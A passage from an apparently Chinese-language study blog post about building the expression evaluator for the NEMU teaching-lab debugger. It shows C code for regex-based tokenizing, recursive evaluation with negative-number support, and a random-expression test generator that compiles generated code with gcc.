class="number">128</span>];</span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_REGEX; i ++) &#123;</span><br><span class="line">    ret = regcomp(&amp;re[i], rules[i].regex, REG_EXTENDED);</span><br><span class="line">    <span class="comment">// 把我们自己订的规则rules存入re数组</span></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">      regerror(ret, &amp;re[i], error_msg, <span class="number">128</span>);</span><br><span class="line">      panic(<span class="string">&quot;regex compilation failed: %s\n%s&quot;</span>, error_msg, rules[i].regex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>int regcomp(regex_t *preg, const char *regex,int cflags);</code></p><p>在一个字符串与正则表达式进行比较之前，首先用regcomp函数对其进行编译，将regex转换为regex_t结构，然后填充到preg中，函数成功则返回0。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">make_token</span><span class="params">(<span class="keyword">char</span> *e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> position = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">regmatch_t</span> pmatch;</span><br><span class="line">  nr_token = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (e[position] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_REGEX; i ++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (regexec(&amp;re[i], e + position, <span class="number">1</span>, &amp;pmatch, <span class="number">0</span>) == <span class="number">0</span> &amp;&amp; pmatch.rm_so == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 把字符串逐个识别成token，存到pmatch</span></span><br><span class="line">        <span class="keyword">char</span> *substr_start = e + position;</span><br><span class="line">        <span class="comment">// 把token对应的起始字符串地址存入substr_start</span></span><br><span class="line">        <span class="keyword">int</span> substr_len = pmatch.rm_eo;</span><br><span class="line">        <span class="comment">// 把token长度存入substr_len</span></span><br><span class="line">        Log(<span class="string">&quot;match rules[%d] = \&quot;%s\&quot; at position %d with len %d: %.*s&quot;</span>,</span><br><span class="line">            i, rules[i].regex, position, substr_len, substr_len, substr_start);</span><br><span class="line">        position += substr_len;</span><br><span class="line">        <span class="keyword">switch</span> (rules[i].token_type) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> TK_DEC:</span><br><span class="line">          tokens[nr_token].type = rules[i].token_type;</span><br><span class="line">            <span class="built_in">strncpy</span>(tokens[nr_token++].str, substr_start, substr_len);</span><br><span class="line">            tokens[nr_token].str[substr_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="comment">// 匹配token，把它们存入数组tokens</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> TK_NOTYPE:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == NR_REGEX) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;no match at position %d\n%s\n%*.s^\n&quot;</span>, position, e, position, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>int regexec(const regex_t *preg, const char *string, size_t nmatch,regmatch_t pmatch[], int eflags);</code></p><p>参数preg指向编译后的正则表达式，参数string是将要进行匹配的字符串。在匹配结束后，nmatch告诉regexec函数最多可以把多少匹配结果填充到pmatch数组中，在匹配结束后，<code>string+pmatch[0].rm_so</code>到<code>string+pmatch[0].rm_eo</code>是第一个匹配的字符串，以此类推。</p></blockquote><h3 id="递归求值"><a href="#递归求值" class="headerlink" title="递归求值"></a>递归求值</h3><p>把待求值表达式中的token都成功识别出来之后，然后就可以进行求值了。</p><p>首先通过检查括号，然后找到优先级最低的符号把它变成主运算符，然后通过分治法，把这个主运算符前后的式子分成子表达式分别计算，然后一直递归子表达式即可。</p><p>例如1+2+3，主运算符应该是最右边的加号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_parentheses</span><span class="params">(Token* start, Token* end)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (start-&gt;type!=<span class="string">&#x27;(&#x27;</span> || end-&gt;type!=<span class="string">&#x27;)&#x27;</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(Token* sym = start; sym&lt;end; sym++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(sym-&gt;type == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">      count++;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sym-&gt;type ==<span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">      count--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count==<span class="number">0</span>) &#123;</span><br><span class="line">      sign=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(count==<span class="number">1</span>&amp;&amp;sign==<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(count==<span class="number">1</span>&amp;&amp;sign==<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  panic(<span class="string">&quot;Error expression&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用于检测前后是否有括号，如果有，将括号去掉。</span></span><br><span class="line"><span class="comment">// (1+(2+3))清掉括号，但是(1+2)+(3+4)则不清理</span></span><br><span class="line"><span class="comment">// 思路是如果开头写过括号，则会到最后闭合，提前闭合就是错误的，根据这一点可以写出代码。</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">eval</span><span class="params">(Token* start, Token* end)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">    <span class="keyword">return</span> atoi(start-&gt;str);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(check_parentheses(start, end) == <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> eval(start + <span class="number">1</span>, end - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val1,val2=<span class="number">0</span>;</span><br><span class="line">    Token *op = clac(start, end);</span><br><span class="line">    val1 = eval(start, op - <span class="number">1</span>);</span><br><span class="line">    val2 = eval(op + <span class="number">1</span>, end);</span><br><span class="line">    <span class="keyword">switch</span> (op-&gt;type) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> val1 + val2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> val1 - val2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> val1 * val2;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">return</span> val1 / val2;</span><br><span class="line">      <span class="keyword">default</span>: panic(<span class="string">&quot;Error expression&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(Token* start, Token* end)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">  Token* op = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (Token* sym = start; sym&lt;=end; sym++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sym-&gt;type==<span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">      count++;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sym-&gt;type==<span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">      count--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count!=<span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sym-&gt;type==TK_DEC) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sign&lt;=<span class="number">1</span>&amp;&amp;(sym-&gt;type==<span class="string">&#x27;+&#x27;</span>||sym-&gt;type==<span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">      op=sym;</span><br><span class="line">      sign = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sign==<span class="number">0</span>&amp;&amp;(sym-&gt;type==<span class="string">&#x27;*&#x27;</span>||sym-&gt;type==<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">      op=sym;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> op;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在递归求值的过程中，逻辑做了两件事情，第一件事情是根据token来分析表达式的结构（找到优先级最低的运算符），然后才是求值。它们在编译器中对应着语法分析，不过编译器分析的是程序的结构，编译器会使用一种框架来分析。</p><h3 id="添加负数"><a href="#添加负数" class="headerlink" title="添加负数"></a>添加负数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// eval修改之处</span></span><br><span class="line">Token *op = calc_op(start, end);</span><br><span class="line"><span class="keyword">if</span>(op-&gt;type != TK_NEG) &#123;</span><br><span class="line">  val1 = eval(start, op - <span class="number">1</span>);  </span><br><span class="line">&#125; </span><br><span class="line">val2 = eval(op + <span class="number">1</span>, end);</span><br><span class="line"><span class="keyword">switch</span> (op-&gt;type) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> val1 + val2;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> val1 - val2;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> val1 * val2;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">return</span> val1 / val2;</span><br><span class="line">  <span class="keyword">case</span> TK_NEG : <span class="keyword">return</span> val2*<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">default</span>: panic(<span class="string">&quot;Error expression&quot;</span>);</span><br><span class="line"><span class="comment">// calc修改之处</span></span><br><span class="line"><span class="keyword">if</span>(sign&lt;=<span class="number">2</span>&amp;&amp;(sym-&gt;type==<span class="string">&#x27;+&#x27;</span>||sym-&gt;type==<span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">  op=sym;</span><br><span class="line">  sign = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(sign&lt;=<span class="number">1</span>&amp;&amp;(sym-&gt;type==<span class="string">&#x27;*&#x27;</span>||sym-&gt;type==<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">  op=sym;</span><br><span class="line">  sign=<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(sign==<span class="number">0</span>&amp;&amp;(sym-&gt;type==TK_NEG)) &#123;</span><br><span class="line">  op=sym;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_Negative</span><span class="params">(Token* start, Token* end)</span> </span>&#123;</span><br><span class="line">  Token* op = start;</span><br><span class="line">  <span class="keyword">for</span>(; start&lt;=end; start++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(start-&gt;type==<span class="string">&#x27;-&#x27;</span> &amp;&amp; (start<span class="number">-1</span>)-&gt;type!=TK_DEC &amp;&amp; (start<span class="number">-1</span>)-&gt;type!=<span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">      start-&gt;type=TK_NEG;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  start=op;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如何测试你的代码"><a href="#如何测试你的代码" class="headerlink" title="如何测试你的代码"></a>如何测试你的代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">60000</span>];</span><br><span class="line"><span class="comment">// %s不能写入65535，最大写入65484。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> code_buf[<span class="number">65536</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *code_format =</span><br><span class="line"><span class="string">&quot;#include &lt;stdio.h&gt;\n&quot;</span></span><br><span class="line"><span class="string">&quot;int main() &#123; &quot;</span></span><br><span class="line"><span class="string">&quot;  unsigned result = %s; &quot;</span></span><br><span class="line"><span class="string">&quot;  printf(\&quot;%%u\&quot;, result); &quot;</span></span><br><span class="line"><span class="string">&quot;  return 0; &quot;</span></span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">choose</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> rand()%i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">gen_num</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i=choose(<span class="number">65536</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(buf+count, <span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">  <span class="keyword">while</span>(buf[count]) &#123;</span><br><span class="line">    count++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">gen_rand_op</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(choose(<span class="number">4</span>)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">sprintf</span>(buf+count, <span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;+&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">      <span class="built_in">sprintf</span>(buf+count, <span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">sprintf</span>(buf+count, <span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">sprintf</span>(buf+count, <span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">gen</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">sprintf</span>(buf+count, <span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">  count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">gen_rand_expr</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//  buf[0] = &#x27;\0&#x27;;</span></span><br><span class="line">  <span class="comment">// 这里不删掉会报错，因为循环</span></span><br><span class="line">  <span class="keyword">int</span> i = choose(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span>(count&gt;<span class="number">20</span>) &#123; i = <span class="number">0</span>; &#125;</span><br><span class="line">  <span class="comment">// 防止表达式太长</span></span><br><span class="line">  <span class="keyword">switch</span> (i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: gen_num(); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: gen(<span class="string">&#x27;(&#x27;</span>); gen_rand_expr(); gen(<span class="string">&#x27;)&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: gen_rand_expr(); gen_rand_op(); gen_rand_expr(); <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> seed = time(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">// time(0)返回当前时间戳，如果失败返回0。</span></span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="comment">// srand是随机数的初始化函数，通过参数生成伪随机数赋值给rand。</span></span><br><span class="line">  <span class="keyword">int</span> loop = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>, &amp;loop);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 把程序执行时的第一个参数存入loop</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loop; i ++) &#123;</span><br><span class="line">    gen_rand_expr();</span><br><span class="line">    <span class="built_in">sprintf</span>(code_buf, code_format, buf);</span><br><span class="line">    <span class="comment">// 把code_format计算器和buf表达式写入code_buf</span></span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/tmp/.code.c&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    assert(fp != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(code_buf, fp);</span><br><span class="line">    <span class="comment">// 把code_buf的数据存入文件</span></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">int</span> ret = system(<span class="string">&quot;gcc /tmp/.code.c -o /tmp/.expr&quot;</span>);</span><br><span class="line">    <span class="comment">// 执行计算器</span></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="comment">// 执行成功返回0，否则继续循环</span></span><br><span class="line">    fp = popen(<span class="string">&quot;/tmp/.expr&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">// 返回执行结果到fp</span></span><br><span class="line">    assert(fp != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d&quot;</span>, &amp;result);</span><br><span class="line">    pclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%u %s\n&quot;</span>, result, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cmd-p和expr"><a href="#cmd-p和expr" class="headerlink" title="cmd_p和expr"></a>cmd_p和expr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">expr</span><span class="params">(<span class="keyword">char</span> *e, <span class="keyword">bool</span> *success)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!make_token(e)) &#123;</span><br><span class="line">    *success = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> num = eval(tokens,tokens+nr_token<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_p</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (args == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No parameters\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">bool</span> success = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">int</span> num = expr(args,&amp;success);</span><br><span class="line">  <span class="keyword">if</span>(success==<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong expression\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x or %dD\n&quot;</span>,num,num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-监视点"><a href="#6-监视点" class="headerlink" 